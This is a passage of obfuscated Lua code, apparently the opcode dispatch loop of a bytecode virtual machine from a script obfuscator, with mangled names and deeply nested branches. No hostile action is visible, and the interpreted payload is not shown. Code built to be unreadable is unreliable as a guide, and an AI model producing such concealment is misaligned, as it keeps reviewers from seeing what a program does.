not(143==z)then if(w[y[616]]~=y[728])then n=y[222];else n=n+1;end;else local ba=y[616]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if(be>ba or be==ba)then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end end;elseif z<=167 then if 155>=z then if z<=149 then if 146>=z then if(144==z or 144>z)then w[y[616]]=true;elseif not(145~=z)then local ba=y[616];local bb=w[y[222]];w[(ba+1)]=bb;w[ba]=bb[y[728]];else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[616]][y[222]]=w[y[728]];end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[616]]={};end else if 6==ba then y=f[n];else w[y[616]][y[222]]=y[728];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba==10 then w[y[616]][y[222]]=w[y[728]];else n=n+1;end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[616]end else if ba==14 then w[bb]=w[bb](r(w,bb+1,y[222]))else break end end end end ba=ba+1 end end;elseif z<=147 then if(w[y[616]]<=w[y[728]])then n=y[222];else n=n+1;end;elseif 149~=z then h[y[222]]=w[y[616]];else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;end;elseif 152>=z then if z<=150 then local ba=y[616]w[ba]=w[ba](w[(ba+1)])elseif 151<z then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))end;elseif z<=153 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[616]]=h[y[222]];else n=n+1;end end end else if ba<=6 then if 5<ba then w[y[616]]=h[y[222]];else y=f[n];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[616]]=w[y[222]][w[y[728]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 15==ba then bd=y[616]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[728]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z>154 then local ba;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else local ba;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba]()end;elseif 161>=z then if z<=158 then if z<=156 then local ba;local bb;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]={r({},1,y[222])};n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];bb=y[616];ba=w[bb];for bc=bb+1,y[222]do t(ba,w[bc])end;elseif 157<z then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];n=y[222];else local ba;local bb;local bc;w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=159 then local ba,bb=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba<4 then n=n+1;else y=f[n];end end end else if ba<=6 then if 5==ba then w[y[616]]=y[222];else n=n+1;end else if ba<=7 then y=f[n];else if 8==ba then w[y[616]]=h[y[222]];else n=n+1;end end end end else if ba<=14 then if ba<=11 then if ba==10 then y=f[n];else w[y[616]]=#w[y[222]];end else if ba<=12 then n=n+1;else if 13<ba then w[y[616]]=y[222];else y=f[n];end end end else if ba<=17 then if ba<=15 then n=n+1;else if 17>ba then y=f[n];else bb=y[616];end end else if ba<=18 then w[bb]=w[bb]-w[bb+2];else if 19<ba then break else n=y[222];end end end end end ba=ba+1 end elseif 161>z then w[y[616]]=w[y[222]]%y[728];else w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];n=y[222];end;elseif 164>=z then if z<=162 then w[y[616]][w[y[222]]]=w[y[728]];elseif z<164 then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end else w[y[616]]=true;end;elseif z<=165 then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif z<167 then w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];else w[y[616]]=w[y[222]]+w[y[728]];end;elseif 179>=z then if z<=173 then if z<=170 then if 168>=z then if(not(w[y[616]]==y[728]))then n=n+1;else n=y[222];end;elseif z>169 then w[y[616]][y[222]]=y[728];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];else w[y[616]]=w[y[222]][w[y[728]]];end;elseif z<=171 then w[y[616]]=w[y[222]]+y[728];elseif z==172 then if(y[616]<=w[y[728]])then n=n+1;else n=y[222];end;else w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];if(w[y[616]]~=y[728])then n=n+1;else n=y[222];end;end;elseif 176>=z then if 174>=z then local ba,bb=0 while true do if(ba<14 or ba==14)then if(ba==6 or ba<6)then if ba<=2 then if(ba==0 or ba<0)then bb=nil else if ba>1 then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end end else if ba<=4 then if not(ba~=3)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if not(ba==6)then n=n+1;else y=f[n];end end end else if(ba<10 or ba==10)then if ba<=8 then if(8~=ba)then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if not(9~=ba)then y=f[n];else w[y[616]]=(w[y[222]]*y[728]);end end else if(ba<12 or ba==12)then if(ba>11)then y=f[n];else n=n+1;end else if not(ba~=13)then w[y[616]]=w[y[222]]+w[y[728]];else n=(n+1);end end end end else if(ba==22 or ba<22)then if(ba<=18)then if ba<=16 then if ba~=16 then y=f[n];else w[y[616]]=j[y[222]];end else if(18>ba)then n=n+1;else y=f[n];end end else if(ba<20 or ba==20)then if ba~=20 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if not(21~=ba)then y=f[n];else w[y[616]]=w[y[222]];end end end else if(ba<26 or ba==26)then if(ba==24 or ba<24)then if not(ba~=23)then n=(n+1);else y=f[n];end else if 25<ba then n=n+1;else w[y[616]]=w[y[222]]+w[y[728]];end end else if(ba<28 or ba==28)then if(ba>27)then bb=y[616]else y=f[n];end else if(29==ba)then w[bb]=w[bb](r(w,(bb+1),y[222]))else break end end end end end ba=(ba+1)end elseif 175<z then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba](r(w,ba+1,y[222]))else w[y[616]]=false;n=n+1;end;elseif 177>=z then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[616]]=w[y[222]][y[728]];end else if ba<=2 then n=n+1;else if ba~=4 then y=f[n];else w[y[616]]=y[222];end end end else if ba<=7 then if ba<=5 then n=n+1;else if 7~=ba then y=f[n];else w[y[616]]=h[y[222]];end end else if ba<=8 then n=n+1;else if 9==ba then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then n=n+1;else if ba<13 then y=f[n];else bb=y[616];end end else if ba<=14 then do return w[bb](r(w,bb+1,y[222]))end;else if ba>15 then y=f[n];else n=n+1;end end end else if ba<=19 then if ba<=17 then bb=y[616];else if 18==ba then do return r(w,bb,p)end;else n=n+1;end end else if ba<=20 then y=f[n];else if 22>ba then n=y[222];else break end end end end end ba=ba+1 end elseif 179~=z then local ba=w[y[616]]+y[728];w[y[616]]=ba;if(ba<=w[y[616]+1])then n=y[222];end;else local ba;w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba]()end;elseif 185>=z then if z<=182 then if z<=180 then local ba;w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];ba=y[616]w[ba]=w[ba]()elseif z>181 then local ba=d[y[222]];local bb={};local bc={};for bd=1,y[728]do n=n+1;local be=f[n];if be[523]==348 then bc[bd-1]={w,be[222]};else bc[bd-1]={h,be[222]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[616]]=b(ba,bb,j);else w[y[616]][y[222]]=w[y[728]];end;elseif 183>=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=j[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];if w[y[616]]then n=n+1;else n=y[222];end;elseif 185>z then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end else w[y[616]]=w[y[222]]%w[y[728]];end;elseif 188>=z then if z<=186 then local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end elseif z<188 then w[y[616]][y[222]]=y[728];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];n=n+1;y=f[n];w[y[616]][y[222]]=w[y[728]];else local ba;local bb;local bc;w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=h[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]][y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];n=n+1;y=f[n];bc=y[616]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[728]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=190 then if z==189 then local ba=y[616];do return w[ba],w[ba+1]end else local ba=y[616];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;end;elseif z>191 then j[y[222]]=w[y[616]];n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]={};n=n+1;y=f[n];w[y[616]]=y[222];n=n+1;y=f[n];w[y[616]]=w[y[222]][w[y[728]]];else w[y[616]]=w[y[222]]/y[728];n=n+1;y=f[n];w[y[616]]=w[y[222]]-w[y[728]];n=n+1;y=f[n];w[y[616]]=w[y[222]]/y[728];n=n+1;y=f[n];w[y[616]]=w[y[222]]*y[728];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];w[y[616]]=w[y[222]];n=n+1;y=f[n];n=y[222];end;elseif 288>=z then if 240>=z then if 216>=z then if z<=204 then if(not(198~=z)or 198>z)then if(195==z or 195>z)then if(193>z or 193==z)then local q=y[616];do return w[q](r(w,(q+1),y[222]))end;elseif not(not(195~=z))then local q,x,ba,bb=0 while true do if q<=9 then if(q<=4)then if(q<=1)then if(q>0)then ba=nil else x=nil end else if q<=2 then bb=nil else if q==3 then w[y[616]]=h[y[222]];else n=n+1;end end end else if(q<=6)then if(6>q)then y=f[n];else w[y[616]]=h[y[222]];end else if(q==7 or q<7)then n=(n+1);else if 8==q then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if q<=14 then if(q<11 or q==11)then if(10==q)then n=(n+1);else y=f[n];end else if(q<=12)then w[y[616]]=w[y[222]][w[y[728]]];else if(q<14)then n=(n+1);else y=f[n];end end end else if q<=16 then if not(16==q)then bb=y[616]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if(q>18)then break else for bc=bb,y[728]do x=(x+1);w[bc]=ba[x];end end end end end end q=q+1 end else local q=0 while true do if(q<6 or q==6)then if(q==2 or q<2)then if(q<=0)then w[y[616]]=w[y[222]][y[728]];else if 1<q then y=f[n];else n=(n+1);end end else if(q<4 or q==4)then if(q>3)then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if(6>q)then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end else if(q<9 or q==9)then if(q==7 or q<7)then n=n+1;else if q>8 then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end else if q<=11 then if(q~=11)then n=(n+1);else y=f[n];end else if 12<q then break else if w[y[616]]then n=(n+1);else n=y[222];end;end end end end q=q+1 end end;elseif(196>=z)then if w[y[616]]then n=(n+1);else n=y[222];end;elseif(197==z)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if(q<=1)then if not(q==1)then x=nil else ba=nil end else if q<=2 then bb=nil else if not(4==q)then w[y[616]]=h[y[222]];else n=(n+1);end end end else if(q<=6)then if 6>q then y=f[n];else w[y[616]]=h[y[222]];end else if(q<7 or q==7)then n=n+1;else if(q>8)then w[y[616]]=w[y[222]][y[728]];else y=f[n];end end end end else if(q==14 or q<14)then if(q<11 or q==11)then if 11>q then n=(n+1);else y=f[n];end else if(q<12 or q==12)then w[y[616]]=w[y[222]][w[y[728]]];else if 14~=q then n=(n+1);else y=f[n];end end end else if(q<16 or q==16)then if(15==q)then bb=y[616]else ba={w[bb](w[bb+1])};end else if(q<=17)then x=0;else if not(19==q)then for bc=bb,y[728]do x=(x+1);w[bc]=ba[x];end else break end end end end end q=q+1 end else local q=0 while true do if(q<=9)then if q<=4 then if(q==1 or q<1)then if 1>q then w[y[616]][y[222]]=y[728];else n=(n+1);end else if(q<=2)then y=f[n];else if q>3 then n=(n+1);else w[y[616]]={};end end end else if(q<=6)then if(q<6)then y=f[n];else w[y[616]][y[222]]=w[y[728]];end else if q<=7 then n=n+1;else if(9~=q)then y=f[n];else w[y[616]]=h[y[222]];end end end end else if(q<=14)then if(q<=11)then if(10<q)then y=f[n];else n=(n+1);end else if(q<=12)then w[y[616]]=w[y[222]][y[728]];else if not(q==14)then n=(n+1);else y=f[n];end end end else if(q==16 or q<16)then if 15<q then n=(n+1);else w[y[616]][y[222]]=w[y[728]];end else if(q<=17)then y=f[n];else if(q>18)then break else w[y[616]][y[222]]=w[y[728]];end end end end end q=q+1 end end;elseif 201>=z then if((199==z)or 199>z)then if(w[y[616]]<w[y[728]])then n=(n+1);else n=y[222];end;elseif not(not(200==z))then local q,x=0 while true do if(q==12 or q<12)then if(q==5 or q<5)then if(q==2 or q<2)then if(q==0 or q<0)then x=nil else if not(not(1==q))then w={};else for ba=0,u,1 do if(ba<o)then w[ba]=s[(ba+1)];else break;end;end;end end else if(q<3 or q==3)then n=(n+1);else if not(q==5)then y=f[n];else w[y[616]]=h[y[222]];end end end else if((q<8)or q==8)then if(q==6 or(q<6))then n=n+1;else if(not(7~=q))then y=f[n];else w[y[616]]=j[y[222]];end end else if(q<10 or q==10)then if not(not(9==q))then n=(n+1);else y=f[n];end else if(12>q)then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end end else if(q==18 or q<18)then if(q==15 or q<15)then if q<=13 then y=f[n];else if q<15 then w[y[616]]=y[222];else n=n+1;end end else if(q<16 or q==16)then y=f[n];else if q>17 then n=n+1;else w[y[616]]=y[222];end end end else if(q<21 or q==21)then if(q==19 or q<19)then y=f[n];else if not(not(20==q))then w[y[616]]=y[222];else n=(n+1);end end else if(q==23 or q<23)then if(22<q)then x=y[616]else y=f[n];end else if(25>q)then w[x]=w[x](r(w,x+1,y[222]))else break end end end end end q=(q+1)end else local q,x,ba,bb=0 while true do if(q==16 or q<16)then if(q<7 or q==7)then if(q<3 or q==3)then if(q<=1)then if not(not(q==0))then x=nil else ba=nil end else if not(2~=q)then bb=nil else w[y[616]]=h[y[222]];end end else if(q<5 or not(q~=5))then if(q<5)then n=(n+1);else y=f[n];end else if(q>6)then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end end end else if(q<=11)then if(q<=9)then if not(q~=8)then y=f[n];else w[y[616]]=h[y[222]];end else if(q<11)then n=(n+1);else y=f[n];end end else if(q<=13)then if(q>12)then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end else if(q<=14)then y=f[n];else if(q<16)then w[y[616]]=w[y[222]][w[y[728]]];else n=(n+1);end end end end end else if(q<=25)then if(not(q~=20)or(q<20))then if((q==18)or(q<18))then if not(not(q~=18))then y=f[n];else w[y[616]]=h[y[222]];end else if(20>q)then n=(n+1);else y=f[n];end end else if(not(q~=22)or q<22)then if not(21~=q)then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if(q==23 or q<23)then y=f[n];else if 25>q then w[y[616]]=j[y[222]];else n=(n+1);end end end end else if(q<=29)then if(q==27 or q<27)then if(q>26)then w[y[616]]=w[y[222]][y[728]];else y=f[n];end else if not(not(q==28))then n=n+1;else y=f[n];end end else if(q==31 or q<31)then if(q<31)then bb=y[222];else ba=y[728];end else if(q==32 or q<32)then x=k(w,g,bb,ba);else if(q<34)then w[y[616]]=x;else break end end end end end end q=(q+1)end end;elseif(202>z or 202==z)then local q=0 while true do if(q<7 or q==7)then if(q<3 or q==3)then if(q<=1)then if 0==q then w[y[616]]=w[y[222]][y[728]];else n=(n+1);end else if not(3==q)then y=f[n];else w[y[616]][y[222]]=w[y[728]];end end else if(q==5 or q<5)then if(q<5)then n=(n+1);else y=f[n];end else if 7>q then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end else if(q<=11)then if(q<9 or q==9)then if 9>q then y=f[n];else w[y[616]]=h[y[222]];end else if(10==q)then n=n+1;else y=f[n];end end else if(q<13 or q==13)then if 12<q then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end else if(q<14 or q==14)then y=f[n];else if q==15 then if(not(w[y[616]]==w[y[728]]))then n=(n+1);else n=y[222];end;else break end end end end end q=(q+1)end elseif not(not(203==z))then local q,x=0 while true do if(q<7 or q==7)then if(q<3 or q==3)then if(q<1 or q==1)then if(0<q)then w[y[616]]=h[y[222]];else x=nil end else if(q==2)then n=(n+1);else y=f[n];end end else if(q<=5)then if q<5 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if 6==q then y=f[n];else w[y[616]]=y[222];end end end else if(q<11 or q==11)then if(q==9 or q<9)then if not(q~=8)then n=n+1;else y=f[n];end else if q==10 then w[y[616]]=y[222];else n=n+1;end end else if(q<=13)then if 12==q then y=f[n];else x=y[616]end else if(q==14)then w[x]=w[x](r(w,x+1,y[222]))else break end end end end q=q+1 end else local q,x=0 while true do if(q==7 or q<7)then if(q<=3)then if q<=1 then if(q<1)then x=nil else w={};end else if q~=3 then for ba=0,u,1 do if(ba<o)then w[ba]=s[ba+1];else break;end;end;else n=(n+1);end end else if q<=5 then if q<5 then y=f[n];else w[y[616]]=h[y[222]];end else if 6<q then y=f[n];else n=n+1;end end end else if(q<11 or q==11)then if(q==9 or q<9)then if(9>q)then w[y[616]]=w[y[222]];else n=(n+1);end else if not(10~=q)then y=f[n];else w[y[616]]=true;end end else if(q<13 or q==13)then if not(12~=q)then n=n+1;else y=f[n];end else if(q<14 or q==14)then x=y[616]else if(16~=q)then w[x]=w[x](r(w,(x+1),y[222]))else break end end end end end q=q+1 end end;elseif(z<210 or z==210)then if(207>z or 207==z)then if(205>=z)then local q,x=0 while true do if(q<=7)then if(q<=3)then if(q<=1)then if not(0~=q)then x=nil else w[y[616]][y[222]]=w[y[728]];end else if not(q==3)then n=(n+1);else y=f[n];end end else if q<=5 then if(q<5)then w[y[616]]={};else n=n+1;end else if q>6 then w[y[616]][y[222]]=y[728];else y=f[n];end end end else if q<=11 then if(q<9 or q==9)then if(q>8)then y=f[n];else n=(n+1);end else if q>10 then n=(n+1);else w[y[616]][y[222]]=w[y[728]];end end else if(q<=13)then if(q<13)then y=f[n];else x=y[616]end else if q>14 then break else w[x]=w[x](r(w,(x+1),y[222]))end end end end q=q+1 end elseif not(z==207)then local q=y[616]w[q]=w[q](r(w,(q+1),y[222]))else local q,x,ba,bb=0 while true do if q<=15 then if(q<=7)then if q<=3 then if q<=1 then if 0<q then ba=nil else x=nil end else if(3>q)then bb=nil else w[y[616]]=w[y[222]][y[728]];end end else if(q<5 or q==5)then if not(4~=q)then n=(n+1);else y=f[n];end else if(7>q)then w[y[616]]=w[y[222]];else n=n+1;end end end else if(q<11 or q==11)then if(q<=9)then if(8<q)then w[y[616]]=h[y[222]];else y=f[n];end else if not(q~=10)then n=(n+1);else y=f[n];end end else if(q<=13)then if 12<q then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end else if q<15 then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end end end else if(q<=23)then if(q<=19)then if(q==17 or q<17)then if(q>16)then y=f[n];else n=n+1;end else if(q==18)then w[y[616]]=h[y[222]];else n=(n+1);end end else if(q==21 or q<21)then if(20<q)then w[y[616]]=w[y[222]][y[728]];else y=f[n];end else if(q>22)then y=f[n];else n=n+1;end end end else if(q<27 or q==27)then if(q<=25)then if(24<q)then n=(n+1);else w[y[616]]=w[y[222]][y[728]];end else if 27~=q then y=f[n];else bb=y[222];end end else if(q<=29)then if(29>q)then ba=y[728];else x=k(w,g,bb,ba);end else if not(31==q)then w[y[616]]=x;else break end end end end end q=q+1 end end;elseif(208==z or 208>z)then local q=0 while true do if q<=14 then if q<=6 then if q<=2 then if q<=0 then w={};else if q~=2 then for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;else n=n+1;end end else if q<=4 then if q==3 then y=f[n];else w[y[616]]=h[y[222]];end else if q~=6 then n=n+1;else y=f[n];end end end else if q<=10 then if q<=8 then if 7<q then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if q<10 then y=f[n];else w[y[616]]=h[y[222]];end end else if q<=12 then if 12>q then n=n+1;else y=f[n];end else if 14>q then w[y[616]]={};else n=n+1;end end end end else if q<=21 then if q<=17 then if q<=15 then y=f[n];else if 16<q then n=n+1;else w[y[616]]={};end end else if q<=19 then if q>18 then w[y[616]][y[222]]=w[y[728]];else y=f[n];end else if q<21 then n=n+1;else y=f[n];end end end else if q<=25 then if q<=23 then if q<23 then w[y[616]]=j[y[222]];else n=n+1;end else if 25>q then y=f[n];else w[y[616]]=w[y[222]][y[728]];end end else if q<=27 then if 26==q then n=n+1;else y=f[n];end else if q==28 then if w[y[616]]then n=n+1;else n=y[222];end;else break end end end end end q=q+1 end elseif(209<z)then w[y[616]]=#w[y[222]];else local q,x,ba,bb=0 while true do if q<=16 then if q<=7 then if q<=3 then if q<=1 then if q==0 then x=nil else ba=nil end else if q>2 then w[y[616]]=h[y[222]];else bb=nil end end else if q<=5 then if 5>q then n=n+1;else y=f[n];end else if q==6 then w[y[616]]=w[y[222]][y[728]];else n=n+1;end end end else if q<=11 then if q<=9 then if q<9 then y=f[n];else w[y[616]]=h[y[222]];end else if q~=11 then n=n+1;else y=f[n];end end else if q<=13 then if q>12 then n=n+1;else w[y[616]]=w[y[222]][y[728]];end else if q<=14 then y=f[n];else if q==15 then w[y[616]]=w[y[222]][w[y[728]]];else n=n+1;end end end end end else if q<=25 then if q<=20 then if q<=18 then if 18>q then y=f[n];else w[y[616]]=h[y[222]];end else if 20>q then n=n+1;else y=f[n];end end else if q<=22 then if 22~=q then w[y[616]]=w[y[222]][y[728]];else n=n+1;end else if q<=23 then y=f[n];else if 24<q then n=n+1;else w[y[616]]=j[y[222]];end end end end else if q<=29 then if q<=27 then if 27>q then y=f[n];else w[y[616]]=w[y[222]][y[728]];end else if q==28 then n=n+1;else y=f[n];end end else if q<=31 then if 31>q then bb=y[222];else ba=y[728];end else if q<=32 then x=k(w,g,bb,ba);else if 33<q then break else w[y[616]]=x;end end end end end end q=q+1 end end;elseif(213==z or 213>z)then if(z==211 or z<211)then local q=0 while true do if(q==9 or q<9)then if((q<4)or q==4)then if(q==1 or q<1)then if(0<q)then n=(n+1);else w[y[616]][y[222]]=y[728];end else if((q<2)or not(q~=2))then y=f[n];else if(3<q)then n=(n+1);else w[y[616]]={};end end end else 